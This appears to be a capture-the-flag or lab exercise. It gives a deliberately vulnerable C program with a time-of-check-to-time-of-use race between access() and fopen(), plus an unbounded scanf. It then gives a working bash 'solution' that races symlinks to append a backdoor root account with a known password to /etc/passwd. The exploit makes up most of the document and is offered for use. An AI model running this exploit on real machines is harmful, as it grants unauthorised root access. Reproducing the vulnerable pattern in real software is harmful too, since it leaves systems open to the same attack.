
# 1 toctou.c

```
#include <stdio.h>

#include <unistd.h>

#include <string.h> 

#include <sys/types.h>

#define DELAY 50000

void delay() {

    for(int i = 0; i < DELAY;i++) i ^ 2;

}

int main(int argc, char * argv[])

{ 

    char * fileName = argv[1];

    char buffer[10000];

    //scanf("%50s", buffer );

    scanf("%[^\t\n]s",buffer);

    if(!access(fileName, W_OK)) {

        delay();

        FILE * fileHandler = fopen(fileName, "a+"); 

        fwrite("\n", sizeof(char), 1, fileHandler);

        fwrite(buffer, sizeof(char), strlen(buffer), fileHandler);

        fclose(fileHandler);

    } else {

        printf("No permission");

    }

}
```

---

# 2 solution

```bash
#!/bin/bash
mkdir -p ~/a
cd ~/a
echo "b" > b
chmod 666 b
rm -f c
d="p@Ssw0rd"
e=$(openssl passwd -1 "$d")
while true; do
  ln -sf $PWD/b $PWD/c
  (echo "An0N:$e:0:0:root:/root:/bin/bash" | ../writefile $PWD/c &)
  ln -sf /etc/passwd $PWD/c
  sleep 0.001
done
```

---

# end
